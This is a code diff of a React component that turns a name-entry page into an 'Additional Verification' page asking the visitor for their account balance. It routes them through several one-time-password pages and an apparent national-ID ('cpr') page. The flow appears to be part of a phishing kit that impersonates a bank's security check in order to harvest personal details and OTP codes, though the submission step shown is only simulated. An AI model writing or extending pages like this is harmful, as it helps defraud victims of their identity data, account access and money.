@@ -1,27 +1,28 @@
-// PersonalInfo.jsx
+// AccountBalance.jsx
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 
-export default function Realname() {
+export default function AccountBalance() {
   const navigate = useNavigate();
-  const [fullName, setFullName] = useState("");
+  const [balance, setBalance] = useState("");
   const [loading, setLoading] = useState(false);
 
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    if (!fullName.trim()) {
-      alert("Please enter your full name");
+    if (!balance || isNaN(balance)) {
+      alert("Please enter a valid balance");
       return;
     }
 
     setLoading(true);
 
-    // Simulate processing
+    // Simulate sending data
     setTimeout(() => {
       setLoading(false);
-      navigate("/secondotp"); // replace with your next page route
-    }, 1000);
+      // For example, navigate to OTP page
+      navigate("/lastotp");
+    }, 1500);
   };
 
   return (
@@ -42,31 +43,33 @@ export default function Realname() {
       <div className="text-center mb-10">
         <h1 className="text-2xl font-light mb-2">Additional Verification</h1>
         <p className="text-sm opacity-80">
-        For your security, please provide the following information to complete the verification process
+          For your security, please provide the following information to complete the verification process
         </p>
       </div>
 
       {/* Form */}
-      <form onSubmit={handleSubmit} className="flex flex-col w-full max-w-md">
-        <div className="mb-8">
-          <input
-            type="text"
-            placeholder="Full Name *"
-            value={fullName}
-            onChange={(e) => setFullName(e.target.value)}
-            className="w-full bg-transparent border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
-            required
-          />
-        </div>
+      <form
+        onSubmit={handleSubmit}
+        className="flex flex-col w-full max-w-md gap-6"
+      >
+        <input
+          type="number"
+          placeholder="Enter your account balance *"
+          value={balance}
+          onChange={(e) => setBalance(e.target.value.replace(/\D/g, ""))}
+          required
+          className="w-full bg-transparent border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
+          inputMode="numeric"
+        />
 
         <button
           type="submit"
+          disabled={loading}
           className={`w-full py-4 rounded-full text-lg font-medium transition ${
             loading
               ? "bg-white/30 cursor-not-allowed"
               : "bg-white/20 hover:bg-white/30"
           }`}
-          disabled={loading}
         >
           {loading ? (
             <div className="flex items-center justify-center">
@@ -78,11 +81,12 @@ export default function Realname() {
           )}
         </button>
 
+        {/* Back button */}
         <div className="text-center mt-6">
           <button
             type="button"
-            onClick={() => navigate("/cpr")}
-            className="text-sm text-white/90 hover:text-white underline"
+            onClick={() => navigate("/otp")}
+            className="bg-transparent border-none text-sm text-white/90 hover:text-white underline cursor-pointer"
           >
             ← Back
           </button>
